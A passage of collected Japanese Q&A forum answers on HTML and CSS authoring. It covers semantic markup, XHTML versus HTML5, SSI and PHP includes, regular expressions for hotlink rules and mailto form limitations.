top:3em;left:0; /* リスト分だけ下げておく */ } #albumList li p img{ width:540px;height:auto;/* 巾と高さ */ margin:0 auto; /* 横の中心 */ display:none; /* 見えないように隠す */ } #albumList li:hover p img{ display:block;/* liにマウスオーバーするとdisplay:none→block */ } [HTML] test.cssと言うファイル名でShift_JISでCSSと同じ場所に保存する。 ・960px×720px程度の画像を４枚用意してください。(サイズや縦横比は多少変わっても良いです。) 　ファイル名は1.jpg,2.jpg,3.jpg,4.jpgとでもしておきましょう。 　HTMLソースには、印刷時の写真のサイズを書いておきます。実サイズの半分程度 　なお、 ★Another HTML-lint gateway ( http://openlab.ring.gr.jp/k16/htmllint/htmllint. … ) ★W3C CSS 検証サービス ( http://jigsaw.w3.org/css-validator/#validate_by_ … ) 　で検証済みです。 ※タブは、＿に置換してありますから、元に戻してください。半角スペースでも良いです。 (確認) →このスタイルでは印刷時には画像が印刷されないので、screen(PC用のブラウザ)のみ適用するようにしてある。ためしに印刷プレビューしてみるとスタイルが適用されていない。 →画像の縦横比やサイズが多少変わっていても、それなりに縮小(横幅統一)で表示される。 →HTMLにはデザインに関することは一切書かれていない。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<link rel="stylesheet" type="text/css" media="screen" href="./test.css"> </head> <body> ＿<h1>サンプル</h1> ＿<ul id="albumList"><!-- リンクのターゲットになりうるのでidとしておく --> ＿＿<li>なんとかの写真 ＿＿＿<p><img src="images/1.jpg" width="480" height="360" alt="富士山"></p> ＿＿</li> ＿＿<li>かんとかの写真 ＿＿＿<p><img src="images/2.jpg" width="480" height="360" alt="河口湖から見た富士山"></p> ＿＿</li> ＿＿<li>もうひとつの写真 ＿＿＿<p><img src="images/2.jpg" width="480" height="360" alt="山中湖から"></p> ＿＿</li> ＿＿<li>これは関係ない写真 ＿＿＿<p><img src="images/4.jpg" width="480" height="360" alt="伊豆から"></p> ＿＿</li> ＿</ul> </body> </html>
「主要ブラウザ表示互換性をチェック」というのは、端的に言えば、各ブラウザのレンダリング結果をプレビューしたいということですよね？　求められている回答でないことを自覚して書きますが、「ソフト」という意味では、OS仮想化ソフトを導入して、各ブラウザをインストールするのが一番堅いんじゃないかと思います。プレビューが面倒だという方もいらしゃるかもしれませんが、Macをお持ちなら、たとえばSpacesで各ブラウザを仮想画面にふりわけるとか、いろいろ方法もあると思いますよ。
sousinsaki.html のあるディレクトリに.htaccessにて AddType application/x-httpd-cgi sousinsaki.html; --サーバーがapacheの場合 sousinsaki.htmlの内容を次のように書き換えます。 !/usr/locla/bin/perl データを読み込み書き出すスクリプト データは、それぞれ$form{'[name]'}に入れる。すべてのデータが揃ったら本来の動作、そうでなければ while(<DATA>){ print; } で、__END__以下のデータを出力する。 __END__ <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ・・・以下HTMLのまま・・・ただし <textarea name="hoge">$form{'hoge'}</textarea> とか、
No.3です。 もう少し補足しておきます。私はオーサリングツールで作られたページの修正を良く行うのですが、たとえばNo.3で示したdiv.section内の目次ですが、<div id="innerLeftBox2">なんてのを見かけます。もし、そのように書かれていたらコメントに<!-- 本文の目次 -->と書いたり、別の一覧表に innerLeftBox2 : 内側のボックスの２番目でボックスの左側に200pz幅で表示する部分 なんて書いておかなければなりません。 　ところが、将来、目次を本文の右に置き換えたとき、管理表も書き換えなければならなくなります。そもそもスタイルシートを見ただけじゃ「わけわかめ」なので、HTMLを開いてどの部分が目次なのか探さなければなりません。fireBugなどを使えば簡単ですが、それでも大きなHTMLだと大変な作業になるでしょう。 　それを防ぐためにHTMLはプレゼンテーションと完全に分離しておかなければなりませんし、HTMLに用意された要素(タグ)で足りなければ、class名(やid)に適切なものを付けておきます。プレゼンテーションのためにHTMLを書かない。 　仕事でウェブページを作成する場合は、誰にでも(検索エンジンも)理解できる簡潔でわかりやすいHTMLやスタイルシートを書くようにしましょう。「コメントや管理表が必要かも？」と不安になった時点で、書き方がまずいのではないかと疑ってください。 　それだけであなたのスキルは上達します。頑張ってください。誰もが通ってきた道ですから・・
<style> .twitter-share-button { width: 115px !important; } </style> を追加
もっとも根本的な誤解があります。HTMLはプレゼンテーションを目的に記述すべきではありません。1999年のHTML4.01の勧告以来、とても強く言われていることです。「構造とプレゼンテーションの分離」 HTMLは、 <body> 　<div class="header"> 　　<h1>見出し</h1> 　</div> 　<div class="section"> 　　<h2>見出し</h2> 　　<p><img></p> 　　<div class="section" id="news"> 　　　<h3>新着情報</h3> 　　　<ol> 　　　　<li>・・・・</li> 　　　　<li>・・・・</li> 　　　　<li>・・・・</li> 　　　</ol> 　　</div> 　　<div class="nav"> 　　　<ol> 　　　　<li><a href=""></a></li> 　　　　<li><a href=""></a></li> 　　　　<li><a href=""></a></li> 　　　</ol> 　　</div> 　</div> 　<div class="footer"> 　　<h2>見出し</h2> 　　<p>宣伝など・・・各ページ共通</p> 　</div> </body> HTML５で書けば <body> 　<header> 　　<h1>見出し</h1> 　</header> 　<section> 　　<h2>見出し</h2> 　　<p><img></p> 　　<section id="news"> 　　　<h3>新着情報</h3> 　　　<ol> 　　　　<li>・・・・</li> 　　　　<li>・・・・</li> 　　　　<li>・・・・</li> 　　　</ol> 　　</section> 　　<nav> 　　　<ol> 　　　　<li><a href=""></a></li> 　　　　<li><a href=""></a></li> 　　　　<li><a href=""></a></li> 　　　</ol> 　　</nav> 　</section> 　<footer> 　　<h2>見出し</h2> 　　<p>宣伝など・・・各ページ共通</p> 　</footer> </body> ですかね。・・・・HTMLは、Markup Languageといわれるように、文字通り文書の構成をマークアップするものでデザインとは切り離しましょう。そうすると、後で自由にデザインできますし、そもそもメンテナンスも楽ですし、検索エンジンも理解してくれます。 　そのうえでスタイルシートで html,body{margin:0;padding:0;} div.header,div.section,div.footer{width:80%;margin:0 auto;} div.section{position:relative;} div.section div.section, div.section h2, div.section p{position:static;width:auto;margin:0 0 0 20%;} div.section div.nav{position:absolute;left:0;top:0;width:20%;height:100%;} とかすれば良いです。細かい部分は書いていません。 HTMLはわかりやすい--人もですが検索エンジンにも---。そしてなによりも後で見直すと気楽です。もちろんスタイルシートも極めて簡単になります。 　floatは、本来の目的は記事中の挿絵などの周囲にテキストを回りこませるためのもので、この様なデザインのときは使うべきではありません。floatさせるためには、必ずそのブロックを前に書かなければなりませんがねそれは文書構造を本来あるべき姿から外してしまいます。 　→Webデザインにおける段組 ( http://ja.wikipedia.org/wiki/%E6%AE%B5%E7%B5%84# … ) 　読み上げブラウザでは、本文より先にリンクを読み上げてしまうとか、検索エンジンにどちらが重要か知らせられない・・。そしてなによりも本文中で挿絵を入れたときにclearすると、一緒にclearされるとか・・
「タグを消す」ということであれば、/<[^>]*>/ か言語によっては /<.*?>/ を空に置換。 ただし、厳密には、<tag attr="<><>"> とかには対応できませんが、現実的には十分でしょう。
できません。大変な迷惑です。・・・ なにに印刷したいか・・・私だったら３種類のプリンター、FAX,PDF・・・も違うし。 単純に印刷用スタイルシートを用意するだけで良いでしょう。
iframeは、内容を持つ要素なので<iframe *****/>なんてことはありえません。 iframeに関しては、HTMLもXHTMLもまったく同じです。すなわち <!ELEMENT IFRAME - - (%flow;)* -- inline subwindow --> ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　この - - は開始タグも終了タグも省略できないということです。 →3.3.3 要素宣言 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　HTMLにおいて、終了タグを省略できる要素は、 COLGROUP,DD,DT,LI,OPTION,P,TBODY,TBODY,TFOOT,TH,THEAD,TR 　・・・これらは、終了タグがなくてもその要素が終わったと判断できるからですね。たとえぱ <p>なんたらかんたらpはPargrph--段落の意味-- <h2>見出し</h2> だと、<p>内にブロック要素は置けないのでブロック要素が現れた時点で、段落は終わったと判断できるからです。 終了タグが存在しないものは、<img>や<link>ですが、これらは空要素で、内容を持たない要素だからですね。 　★基本的なことですが、HTMLは文書を構成する要素に分解して、それぞれの要素をタグでマークアップするものです。たとえば<p>段落の内容</p>・・・ 　<img src="*****>は、内容を持たないから終了タグはないのです。 HTMLの要素一覧がこちらにありますからしつかり理解しておくこと ★Optional, Forbidden, Empty, Deprecated, Loose DTD, Frameset DTD ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　一方、XHTMLは、HTMLをXMLの文法に合うように書き直したものですから、空要素は<img />としなければなりません。これは、<img></img>の簡略した書き方です。HTMLの仕様上はこの様な書き方が許されるのですが、これをきちんと解釈できるブラウザはほとんどないでしょう。 なお、transitinalは、もういくらなんでも止めましょう。1999年12月のHTML4.01の勧告以来 「HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。 」と強く言われ続けています。XHTML1.0は、HTML4.01をXMLで書き直したものですから同じです。その次のXHTML1.1では、transitinal,framesetはすでに存在していませんでしたし、HTML5では、HTML4.01での 「推奨しない要素・属性とは、新しい枠組みができたことによって、陳腐化したものを指す。推奨しない要素は、リファレンスマニュアルの各所で定義し、推奨しないことを明記する。推奨しない要素は、HTMLの将来のバージョンでは廃止になる可能性がある。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 の予告どおり、廃止されています。 　XMLの必要がなければ、XHTMLでなくて、HTML4.01strictをしっかり身につけたほうが良いでしょう。
<span style="background-image: url();"> <input style="background-color: transparent"> </span> IE7の実装イメージ的には、<input>の「枠」の上に「入力欄」があって、その入力欄に背景が表示されている。 入力字数が増えると、『入力欄』がスクロールしていく。 という感じだと思います。 強制アップデートが実行されたので、そろそろIE7を切り捨てても良さそうな気はしますけどね。
No.2 にも書きましたが、タグ短縮をマトモにサポートしているブラウザなんてありませんよ。しかし、中途半端に実装しているブラウザがちらほらあり、そのままでは相互運用性に支障をきたすので、とりあえずそれまでの分については仕様上もタグ短縮を認めるけれども、今後はやらないようにね、というのが HTML 4.0 規定の付録 B. 3 です。付録なので規範性はなかったんですけどね。 Fx 11、Ch 18 なら、すでに HTML(5) の解析ルールで動いているはずです。誤解している方をたまに見かけるので念のため申し上げておきますが、今後のブラウザは例えページが HTML 4.0 で書かれていようと XHTML 1.0 で書かれていようと、原則として全て HTML(5) のルールで解析します。文書型宣言によって解析ルールを切り替える、なんて器用なことはしてくれません（もちろん、文書型宣言の有無だけはモード切替のスイッチになります）。これによって、全てのブラウザは同じ DOM 木を構築する「はず」です。 HTML(5) のルール上、<input radio>、<input checkbox>、<input button> などは未知の論理型属性として無視されます（将来的にそれらが追加される可能性を考慮して、内部的に保存はされる）。つまり、<input my-extend-attr="my-extend-attr"> のように書いたのと同じことです。
オリジナルのシステムが欲しいのであれば、自分で作るか、買うかの2択です。それ以外はありません。質問内容に似たシステムが絶対にないとは言い切れませんが、ほぼオリジナル(注文が細かい)の内容だと思います。
ほぼ同じだと思いますが、全く同じとは限りません。 また、閲覧者側で表示をカスタマイズしている可能性があります。 （老眼・色盲・弱視など） また、ディスプレイ（Win/Mac）、iPhone、iPadでは 表示サイズの違いがあり、見やすさも異なってくると思います。 趣味でやるのでしたらディスプレイで見やすければ大丈夫だと思いますが ビジネスでやるのでしたら、各々の環境に合わせての最適化も必要かもしれません。
HTML5 と XHTML の関係については以下の図が分かりやすいと思います。英語ですが、"Present day" の図だけでも十分です。 http://norman.walsh.name/2011/03/26/HTML-XML-Pra … --- XML というのは、例えば「XML データ 1 と XML データ 2 を、XInclude で結合し、XML Schema でデータチェックした後、XQuery で必要なデータだけを取得し、それを XSLT で XHTML に変換する。という処理フローを XProc で記述する」みたいに、一連の XML 用ツールを使うことでデータを自由自在に扱うためのものです。 Web には大量のデータが蓄積されています。が、もしこれらが 20 年後には「時代遅れ」になって、使えなくなったとしたら残念です。XML は、データが 20 年後でも使えるよう、長期保存に耐え、ツール処理しやすくなるよう考案されたものです。そして、XHTML は HTML を XML 化して、長期保存と XML ツールの適用を可能にしたものです。ですから、XML ある限り XHTML はなくなりません。 ただし、XHTML 2.0 のように「XHTML として機能追加していく」ことはなくなりました。先に HTML5 を定義し、それを XML 化して XHTML5 にする、のような形になります。 --- HTML5 というのは、XML とは別の発想で「データが 20 年後でも使える」ようにしたものです。 そもそも、これまでの 20 年間で「XHTML でないデータ」なんて山ほど作られてきたわけですよ。今さら、それらを捨てるわけにはいかないでしょう。だから、「HTML を解釈するブラウザさえしっかり処理してくれれば、何とかなる」という発想のもと、「今までのデータも含めて、今後はブラウザの解釈をこうするから、ブラウザが解釈できるようちゃんと HTML を書いてくれよ」というのが HTML5 です。 さらに、昨年の 1 月に HTML5 のバージョンは廃止され、今は「HTML 標準」という名前になっています。未だに HTML5 という名称も使われますが、もはやバージョンに意味はなく、今後は HTML6 も HTML7 も出ません。ブラウザのサポート状況を見ながら、少しずつ HTML を改良していくことになります。 ですから、HTML(5) 自体は XML とは別系統になります。バイナリは関係ないです。 --- それと、HTML(5) に CSS や JavaScript は含まれません。それは「バズワード化した HTML5」ですので、惑わされないで下さい。 HTML、CSS、JavaScript など、ブラウザを基盤とするウェブアプリの API 群を総称して「Web Platform」と呼びます。以下の図が分かりやすいでしょう。 http://edward.oconnor.cx/2009/05/what-the-web-pl … Web Platform の一部をなすのが HTML ですが、XML「も」含まれます。 ※なお、WHATWG の The Web Platform は定冠詞付きですが、W3C の An Open Web Platform は不定冠詞と open が付いています。
出力部というのは、PHPなどで動的にコンテンツを表示することを想定して書きました。 少し言葉足らずでしたね、すみません。 静的なページならファイルの保存の時だけ気をつければ大丈夫です。 他には、ブラウザで特定のページのエンコーディングをメニューから変更すると、その設定が一時的に保持されたりするので、そういう場合でも時々文字化けるというシチュエーションに相当するかもしれません。これは技術でどうこうできる問題ではありませんが。。。
私の環境では、IE6で再現しません。 想像するところ、配列定義の最後に「,」（カンマ）を入れてたりしませんか？ その場合は、順番に表示するうちのどこかでエラーが発生するので、ご質問の状況と似た結果が生じると思われます。 ＞調べてみると中でundefinedなときがあり 何を調べるとundefinedなのか書いてないのでわかりませんが、lengthを調べてみれば多分わかると思います。
<title>を書く位置は<head>内の最後でも良いです。ただし<title>は必ず1つで、複数書くことも省略もできません。厳密な文法に従うなら。 HTMLの文法はDTDという形式で標準化されています。それを見れば、どのタグをどこに書けるかが分かります。ただし人間が読むにはつらい形式なので、調べるときにはDTDをサポートしているエディタを使うと楽です。 XHTMLならXMLの一種なのでXMLエディタが利用できます。少なくとも妥当性検証の機能があるものでないと、DTDをサポートしていないでしょう。 それ以前のHTMLはSGMLの一種なのでSGMLエディタが利用できます。（ですが数が少なく、フリーソフトでDTDをサポートするものは操作の難しい emacs エディタの psgml モードしか知りません） 参考URL：http://www.w3.org/TR/html4/sgml/dtd.html
Htmlでは動画は動かないんですよ。 ソースちらっと見ましたが、JavaScript みたいですね JavaScript 　記述位置 で検索してみると良さそうです。
＞検索のキーワードがわからず困ってます。 アコーディオン、アコーディオンメニュー です。
キーボードの故障ないしスペースキーの抑えっぱなし・・ そのため、半角スペースを表すが
jQueryですが・・ jquery スライドショー 自動 横 - Google 検索 ( https://www.google.co.jp/#hl=ja&safe=off&output= … ) と検索すれば色々と出てくる。
　Windowsは、大文字小文字を区別できません。キーボードには昔から小文字なんてありませんが・・・同じ場所にjapanese.jpgとJapanese.jpgは置けません。 ですから、Windowsを使う限り何を使っても良いことになります。 　しかし、他の古くからあるOSは、大文字と小文字を区別しますから、同じディレクトリに、Japanese.jpg,Jananese.jpg,Japanese.JPG・・・をおくことができます。これは、ファイル名をつけるときにルールを決めておかないと困ったことになります。 　たとえば、HTMLに<img src="Japanese.jpg">と書いてあって、実際のファイル名がjapanese.jpgであってもWindows上で確認する限り、まったく問題なく表示されますが、サーバーにアップロードしたら表示されないけど原因がわからない・・・ってことになりかねません。このトラブルの質問は、「shadowbox3.0.3で画像が開きません - Webデザイン・CSS - 教えて！goo ( http://oshiete.goo.ne.jp/qa/7407297.html )」のように、この掲示板にも結構あります。 　 　UNIXでは、従来からファイル名は小文字で記述して、合成語の場合は二つ目の単語の頭文字を大文字にしたりするので、その慣習が残っています。すなわち、manualAll.jpgとか、manualMainBord.jpgとか・・ 　また、多くのOSでは拡張子はそれ自体が特定の意味を持ちません。そのため拡張子を含めて自由にファイル名を変更できます。Windowsは拡張子が必須ですし、拡張子を帰ることが出来ません。もちろん、拡張子だけのファイル(.htaccessとか.passwordとか)も通常は使いません。new.tar.gzなんてのも通常は使いません。---UNIX由来のhostsのような拡張子のないファイルもありますが・・・ 　HTMLでの要素ですが、HTMLの仕様では、大文字と小文字の区別はしません。 ・要素名には、常に大文字小文字の区別はない。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )--HTML4.01 ・HTML5では、大文字小文字は区別しませんが、XHTML5で記述するときは要素名、属性名は小文字でなければなりません。HTML5には、HTMLとして書く方法とXHTMLとして書く方法がある。 　現在、HTMLにおいて小文字が主流なのは、HTMLは、HTML4.01が最後で今後はすべてXHTMLになると思われていた時代の名残です。(XHTMLはXMLなので、XMLのルールに従う) 　まあ、自分が見やすければどちらでもよいのですが、プログラム言語によると、プログラム内で大文字で始まる単語は特別な意味を持つことがあるので、その手のプログラムを扱う人は、ファイル名やHTMLは小文字で書くように統一されている人もいらっしゃいます。 　まあ、あまり自分自身の慣習ではなく、世間一般の慣習に従うのが良いでしょうね。
＞ホームページに特化してＧＵＩ的に簡易的に編集できるものがあれば知りたいです。 　いわゆるWebオーサリングツール( http://ja.wikipedia.org/wiki/Web%E3%82%AA%E3%83% … )をお探しだと言うことですね。上記リンクをご確認ください。 　オーサリングツールは、GUIでHTMLを書こうと言うことなのですが、残念ながら上記にも書かれているように、GUIでは不可能な部分があまりにも多いので、現在は、サイト管理には重宝していますが、私はHTMLやCSS,javascriptなどを記述するためには使用していません。 　HTML4.01の時代から「HTMLでページを作らずにプログラムに頼る。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」事の弊害が指摘されているように、オーサリングツールでは不可能な事が多すぎるからです。 　HTML(Hyper Text Markup Langage)は、そもそも ★文書をそれを構成する要素に分解し、その要素をタグでマークアップしたものです。 　その文書を読み取り内容を理解して、「どこからどこまでがひとつの段落<p></p>であるか」「どこからどこまでが引用文<blockquote></blockquote><q></q>であるか」「どこが見出し<hn></hn>であるか」を判別することは不可能です。 　さらに、『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するため ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』に使いますが、この部分は本文だから<div class="section"></div>、本文と関係ないから<div class="aside"></div>、挿絵だから<div class="figure"></div>なんてことはオーサリングツールにはできるはずも無い。 　ちなみに、これらはHTML5では、新しい要素<header><section><footer><aside><figure>として独立します。→新しい要素 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … ) 　言い換えれば、HTMLを書くことをオーサリングツールに任せる必要が無い、というか任せるべきではないです。「HTMLエディタで作成するシンプルなコードは ( http://ja.wikipedia.org/wiki/Web%E3%82%AA%E3%83% … )」HTMLエディタ ( http://ja.wikipedia.org/wiki/Web%E3%82%AA%E3%83% … )でないと書けないのです。 　HTMLエディタとして、たとえばEmEditorではプレビューに様々なブラウザを設定できますから、ブラウザで表示を確認するのは苦ではないでしょう。 　一方スタイルシートは、もっと深刻でたとえば文書構造を読み取って div.section div.aside{font-size:0.5em;margin:0.5em 1em;border:solid 1px gray;padding:0.5em 1em;} 　なんてのは、不可能に近いです。オーサリングツールでは、適当なidやclass名でも振って設定するのが限界です。それでは、のちのちの見直しのときに、HTMLのソースを見なければ判らなくなりますよね。 　HTMLで使用するタグなんて、せいぜい数十個・・多くて４０個でしょう。中学校で学ぶ英単語は２,０００語と比較して微々たる物です。スタイルシートには、重要な部分でまったく未対応です。 　なら、HTMLやスタイルシートを書くためにオーサリングツールを使用するのは無意味です。 　なお、もっともウェブ標準なHTMLを作成するオーサリングツールとして定評があるのは、SeaMonkey ( http://www.seamonkey.jp/ )でしょう。上記Webオーサリングツールでは、Mozilla Composer( http://ja.wikipedia.org/wiki/Mozilla_Composer )として紹介されているものです。しかし、どのツールにもいえますが、HTMLやCSSを知っていないとちゃんとしたものはできませんし、知っていればツールに頼る必要が無い。
どういう環境でそうなるか把握できませんが、そういう現象は大概JavaScriptが原因なので、まずJavaScriptが実行されないようにブラウザを設定して同様の現象が起こるか確認して下さい。 そこで、もしその現象が解消されればJavaScriptの作用が原因であるということなので、原因となるJSファイルを特定してください。具体的にはonloadなどという記述があれば疑わしいですが、この限りではありません。 とにかくHTMLの読み込み完了とともに何らかのJavaScript関数が実行されていると考えられるので、そのような初期化をする作業を担っているファイルを取り除くか変更すれば良いでしょう。作り始めの頃から現在までの間で追加されたJSファイルがあれば、その中に含まれていると思います。
私の環境では再現できません。 メモ帳（Windows附属のメモ帳）にドラッグ＆ドロップしても、改行は元のままです。 ドラッグ＆ドロップではなく、「ファイル」-「開く」から指定して開いてもも同じ状況でしょうか？
サイトの説明を最後までしっかり読んでください。 まず、.と言う文字は、Windowsで言うところの*とよく似た、{あらゆる文字}を表す記号です。正規表現で .* と書けば、０文字以上のすべての文字となってしまいます。 　もし、正規表現に "^http://allabout.co.jp" と記述すると、 http://allaboutAcoBjp にも http://allaboutQcoZjp にもマッチしてしまいます。そこで.をエスケープしなければなりませんから http://allabout\.co\.jp とかくのです。 　もちろん、正規表現を展開しないように 'http://allabout.co.jp' と書けばよいのですが、そうすると行の先頭からを示す^が使えません。そのために "^http://allabout\.co\.jp" と記述するのです。逆スラッシュは日本語OSでは\と表示されますが、文字コードは逆スラッシュと同じものです。ですから、それは気にしなくて良いです。 　あなたが示された 直リンクを防ぐには？…禁止と言っても無駄 [ホームページ作成] All About ( http://allabout.co.jp/gm/gc/23915/ ) 　は、４ページから成り立っています。この説明も４ページ目に詳しく記載されています。きちんと読んで、それでも理解できないときに質問されたら、ピンポイントで解決が得られるでしょう。 　なお、正規表現はとても重要な知識ですから、覚えておきましょう。 正規表現 ( http://ja.wikipedia.org/wiki/%E6%AD%A3%E8%A6%8F% … ) CGI-Perl 基礎編 (その八) 正規表現、マッチパターン、置換演算子、変換演算子 - SAK Streets ( http://homepage2.nifty.com/sak/w_sak3/doc/sysbrd … ) 　テキストエディタで、特定のタグを選び出したり---m/<p>.*?</p>/m　とか。すべてのHTML内のheader内を置換してしまうとか・・・s/<header>.+</header>/$newHeader/m; とか・・ 　
liのプロパティ値がインライン要素（display:inline;）だから横並びになります。 縦並びならブロック要素（display:block;）に。 .pagination li{ list-style-type: none; display: inline; padding-bottom: 1px; } 　　　　↓ .pagination li{ list-style-type: none; display: block; padding-bottom: 1px; }
HTML+CSSだけでは不可能です。(CSSでの非表示でもよいなら話は別ですが) JavaScriptなら技術的には可能ですがデメリットも大きいので、既出のSSIやPHPを使用されてはどうでしょう? どちらにしても共通ファイルの読み込み程度でしたらさほど知識も必要ありません。 あらかじめ共通化したい部分を　たとえば navi.html などとして保存しておき、各ページのHTML内では SSIなら <!--#include file="navi.html" --> PHPなら <?php include "navi.html"; ?> と書くだけです。 ※ただし サーバによってはSSIなら.shtml , php なら.phpなどと拡張子が定められていることがあります。.htmlのままで上記を使用できるかどうかはサーバによるので要確認。 SSI http://www.tohoho-web.com/wwwssi.htm
#3 です。 Web担当とのことですが、対象ブラウザは自分一人で決定できる状況にあるのでしょうか。 顧客から要件を聞いて制作するスタイルではXHTMLだけでは厳しいですが、全てがsakura-garashaさんに任されている場合は言語にとらわれる必要はないと思います。 お話を伺う限りではXHTMLを極める流れでいいように思います。 参考までにXHTMLの参考URLを紹介しておきます。 http://www.y-adagio.com/public/standards/tr_xhtm … http://www.y-adagio.com/public/standards/tr_xhtm … http://www.y-adagio.com/public/standards/tr_xhtm … http://web.archive.org/web/20060905081722/http:/ … http://standards.mitsue.co.jp/resources/w3c/2009 … 必要なら(XHTMLではなくHTML5を採用する理由があれば)、その時にHTML5に移行すればいいのではないでしょうか。
できません。もちろんjavascriptを使用したり、iframeでメニューを表示させるとかは可能ですが、それらは、HTML本来の最大の目的からは逸脱します。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　javascriptやiframeを理解できないユーザーエージェントには無効ですし、なによりも検索エンジンはjavascriptなんて理解できませんからSEOとしては致命的になります。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから Lynx などのテキスト ブラウザを使用して、サイトを確認します（ほとんどの検索エンジンのスパイダーには Lynx で見えるようにサイトが映ります）。JavaScript、Cookie、セッション ID、フレーム、DHTML、Flash などの特殊な機能が使用されているためにサイトの一部がテキスト ブラウザで表示されない場合、検索エンジンのスパイダーがサイトをうまくクロールできない可能性があります。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［ウェブマスター向けガイドライン - ウェブマスター ツール ヘルプ( http://support.google.com/webmasters/bin/answer. … )］より 　私は下記のいずれかの対策を採ります。 1) 小規模なサイト--100ページ未満 　テキストエディタで、一挙に書き換えます。たとえば私が使用しているEmEditor(Pro)では、「ファイルから変換」という機能がありますから、すべてそれで変換しています。 2) 大規模なサイト---、同じようなページが多いとき 　HTML自体を、動的に作成しています。すなわち、HTML内にキーワードを埋め込んでおいて、サーバーから提供するときには、各ページで共通な部分--ヘッダの一部、ナビゲーション、フッタ、新着情報など付録的な記事などです。具体的な方法は / hoge.com ルート 　|-- index.html 　|-- document ※ 　|-- document_data/ 　　　　|-- hoge1.html 　　　　|-- hoge2.html 　　　　|-- chapter1 　　　　|　　|-- hoge1.html 　　　　|-- chapter2 　ここで、documentというファイルは、CGIです。ユーザーからたとえば、 http：//hoge.com/document/hoge1.html が要求されると、そのようなファイルはありませんから、/hoge1.html はサーバー上でPATH_INFOと言う環境変数に格納されて、最終的にdocumentにたどり着き、それがCGIなどの実行ファイルですから、それが実行されます。documentは、環境変数の/hoge1.htmlと、document_dataを結びつけて、document_data/hoge1.htmlを開き、書き換える場所があれは書き換えて出力します。 　document/chapter1/h0oge1.html が要求されたときも同様です。 　新聞社のサイトなど、大規模なサイトは基本的に同様な方法で動的にページを作成しています。あのURLのページが実在することはありえません。--刻々と変わる内容をすべてのページについて書き換えるなんて事はありえません。
これは、googleが必要があると自動的に判断したときに作成されて表示される「サイトリンク」と呼ばれるものです。 詳しくは サイトリンク - ウェブマスター ツール ヘルプ ( http://support.google.com/webmasters/bin/answer. … ) 　サイト内にサイトマップを用意してあると思いますが、これを利用しているわけではないようですが、将来的にはサイトマップを利用することも可能になるでしょう。 ウェブマスター ツール ヘルプ ( http://support.google.com/webmasters/?hl=ja ) 　→サイトマップ
【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから name = cdata [CS] 　この属性は、他のリンクからの終点となり得るよう、当該アンカーに名前をつける。この属性値は固有のアンカー名でなければならない。 この名前の有効範囲は、当該文書内に限られる。 この属性が、id属性と同じ名前空間を共有することに注意されたい。 href = uri [CT] 　この属性は、Webリソースの所在を指定する。これによって当該要素(始点側アンカー)と、この属性が定める終点側アンカーとの間のリンクが定まる。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Links in HTML documents (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　すなわち、href="[URI]#ページ内アンカー" と記述するということです。 [URI]の部分には、リンク先のページへのURI--http://**** , ../****, など #以降は、サーバーには送られませんが、ブラウザはそのページのname/idで特定される要素を探すことになります。 　href="#アンカー" は、href="[自信のURI]#" と言う意味です。
<form action="mailto:***** は、使うべきではありません。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから action = uri [CT] 　この属性は、フォーム処理エージェントを指定する。HTTPスキームURI以外の値の場合のユーザエージェントの動作は、定義しない。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［17.3 FORM要素( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　上記にもあるように、formは、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから テキストを追加する、メニュー項目を選ぶ、等してこれらコントロールを変更してフォームを「完成」させ、その後フォーム処理のためにWebサーバやメールサーバ等のエージェントへとフォームを提出する。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Forms in HTML documents (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　mailto:が有効なのは、利用者がメールソフトを利用でき、かつブラウザにMUA(Mail user agent)--メールソフト--を指定しているときだけに有効ですが、その場合もきちんとした正しい書式のメールが送信できるわけではなく、大抵は文字化けなどに悩まされます。 　あくまで、 <form action="[URI]"***として、サーバーにあるCGIなどのプログラムに対してデータを送信し、そのプログラムはサーバーにあるMTA(Mail Transfer Agent)--メール転送エージェントsendmailとかにデーターを渡します。すなわち <form action="./cgi-bin/sendmail.cgi" とかが具体的な書き方にならなければなりません。 　FCのホームページスペースでは、CGIは使えなかったと思います。FC2レンタルサーバーのサービス(有料)を利用することになるでしょう。ただ、FC2はサポートに問題があると聞きますので・・・ 　ご利用のインターネット接続サービス--ISP--のサービスなどを調べて見られたら? 　私は@niftyですので・・ 